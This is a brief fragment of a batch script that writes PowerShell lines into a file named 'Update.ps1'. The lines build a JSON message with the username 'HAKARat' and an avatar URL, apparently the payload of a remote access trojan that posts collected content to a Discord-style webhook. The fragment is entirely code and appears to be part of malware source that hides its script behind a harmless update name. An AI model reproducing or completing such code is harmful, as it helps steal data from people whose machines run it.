...
echo >>Update.ps1
echo $JSON = @{ "content"= $content; "username"= "HAKARat"; "avatar_url"= "https://t3.ftcdn.net/jpg/05/66/13/24/240_F_566132461_AOlcuZSItoUsL4391wV2pL134Qyu5muT.jpg" }  ^| convertto-json>>Update.ps1
